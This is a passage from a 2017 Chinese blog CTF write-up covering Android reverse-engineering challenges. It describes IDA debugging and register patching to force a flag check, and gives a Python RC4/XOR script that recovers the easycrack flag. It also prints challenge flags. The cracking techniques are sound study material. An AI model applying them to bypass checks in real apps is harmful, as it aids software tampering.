<p>再整理一遍就是，会不断获取传感器数据，将传感器数据传入a_process ，然后判断返回值，如果返回值是6，则调用 b_process ，并将结果跟6相 加，再返回跟数组对比，十次对比全部一样应该就可以输出Flag</p>
<p>接下来动态调试 直接使用IDA attach上应用，没有发现反调试，找到so的加载地址，静态分析出两个函数偏移，加上加载基址，按g跳过去下断点，然后慢慢边跑 代码边修改R0的值即可 在调用完后下断点<br>同样在 b_process 函数调用后一条指令下断点</p>
<p>中间出现好多条</p>
<pre><code>Nice,Go on! ctfer 
</code></pre><p>之后出现flag</p>
<pre><code>03-26 06:26:27.648: I/an-activity(16735): The flag is:njctf{PvrNa7iv3Al1} 
</code></pre><p>###apk-easycrack</p>
<p>不是很复杂的安卓逆向题。java层几乎没有什么东西，而lib库也提供了x86指令集的版本。所以其实就是个正常的逆向题而已。</p>
<p>java代码里面值得注意的代码只有这个messageMe。将apk的包名easycrack进行一次循环亦或。然后返回。</p>
<p><img src="http://p1.bqimg.com/567571/e64d0f37a40cdd03.png" alt=""></p>
<p>然后就是看看静态的parseText函数。</p>
<p><img src="http://i1.piimg.com/567571/2f2962f9ee3da6aa.png" alt=""></p>
<p>首先是将输入和messageMe的返回值做一次异或。这一段很简单。</p>
<p><img src="http://i1.piimg.com/567571/94c4021b8c6d04f2.png" alt=""></p>
<p>最后是一段rc4的代码。已经看到不下4次rc4了。一看这sbox的初始方式就是rc4了。</p>
<p>所以解密也很简单。rc4的加密和解密是一样的代码。异或之类的运算也是可逆的。掏出祖传的rc4解密脚本改一改就能出flag了。</p>
<pre><code>ram = &apos;I_am_the_key&apos;                                                                                                                                                          
def getstr(string):
        table = []
    for i in range(256):
        table.append(i)
    v10 = 0 
    for i in range(256):
        v10 = (table[i] + v10 + ord(ram[i%len(ram)]))%0x100
        table[i],table[v10] = table[v10],table[i]
    v12 = 0 
    v13 = 0 
    s = &apos;&apos;
    for i in range(len(string)):
        v12 = (v12 + 1)%0x100
        v13 = (v13 + table[v12])%0x100
        table[v12],table[v13] = table[v13],table[v12]
        s += chr(ord(string[i]) ^ table[(table[v12]+table[v13])%0x100])
    return s


f = getstr(&apos;C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4&apos;.decode(&apos;hex&apos;))
#print f.encode(&apos;hex&apos;)


m = &apos;easycrack&apos;
n = &apos;&apos;
c = 51

for i in range(len(m)):
    c ^= ord(m[i])
    n += chr(c)

#print n.encode(&apos;hex&apos;)

flag = &apos;&apos;
for i in range(len(f)):
    flag += chr(ord(f[i]) ^ ord(n[i%len(n)]))

print flag
</code></pre>
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2017/03/17/NJCTF-writeup总结/">NJCTF writeup总结</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">Mr_white</a></p>
        <p><span>发布时间:</span>2017-03-17, 09:34:57</p>
        <p><span>最后更新:</span>2017-05-10, 13:54:35</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2017/03/17/NJCTF-writeup总结/" title="NJCTF writeup总结">http://xq.dropsec.xyz/2017/03/17/NJCTF-writeup总结/</a>
            <span class="copy-path" data-clipboard-text="原文: http://xq.dropsec.xyz/2017/03/17/NJCTF-writeup总结/　　作者: Mr_white" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2017/03/16/ZCTF-writeup总结/">
                    ZCTF writeup总结
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-messagner"><span class="toc-number">1.</span> <span class="toc-text">###PWN-messagner</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-233"><span class="toc-number">2.</span> <span class="toc-text">###pwn-233</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-vegas"><span class="toc-number">3.</span> <span class="toc-text">###PWN-vegas</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-syscallhelper"><span class="toc-number">4.</span> <span class="toc-text">###PWN-syscallhelper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-vsvs"><span class="toc-number">5.</span> <span class="toc-text">###PWN-vsvs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-pingme"><span class="toc-number">6.</span> <span class="toc-text">###PWN-pingme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE-first"><span class="toc-number">7.</span> <span class="toc-text">###RE-first</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE-echo-sever"><span class="toc-number">8.</span> <span class="toc-text">###RE-echo sever</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE-on-the-fly"><span class="toc-number">9.</span> <span class="toc-text">###RE-on the fly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apk-safebox"><span class="toc-number">10.</span> <span class="toc-text">###apk-safebox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apk-LittleRotatorGame"><span class="toc-number">11.</span> <span class="toc-text">###apk-LittleRotatorGame</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    

    
</div>







    




    <div class="scroll" id="post-nav-button">
        
            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2017/03/16/ZCTF-writeup总结/" title="下一篇: ZCTF writeup总结">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/NJCTF-writeup总结/">NJCTF writeup总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/16/ZCTF-writeup总结/">ZCTF writeup总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/practice-8之PEiD插件/">practice 8之PEiD插件</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/14/practice-7之行为分析/">practice 7之行为分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/13/practice-6之算法夹杂/">practice 6之算法夹杂</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/12/practice-5之万能断点/">practice 5之万能断点</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/12/practice-4之IDA用法/">practice-4之IDA用法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/10/practice-3之pyo学习/">practice-3之pyo学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/10/practice-2之汇编/">practice-2之汇编</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/09/8道Pwn基础练习所得/">8道Pwn基础练习所得</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/08/一步一步学ROP之x86篇/">一步一步学ROP之x86篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/30/practice-1之图片reverse/">practice-1之图片reverse</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/16/寒假计划/">寒假计划</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/12/GDB寄存器和内存查询指令/">GDB寄存器和内存查询指令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/30/gdb与peda指令学习学习笔记/">gdb与peda指令学习学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/18/Python学习/">Python学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/04/hexo搭建/">hexo搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/03/Google-hacking-语法/">Google hacking 语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/03/绕过网站访问限制的方法/">绕过网站访问限制的方法</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2016-2017 Mr_white
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 5;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) Mr_white " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) Mr_white " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>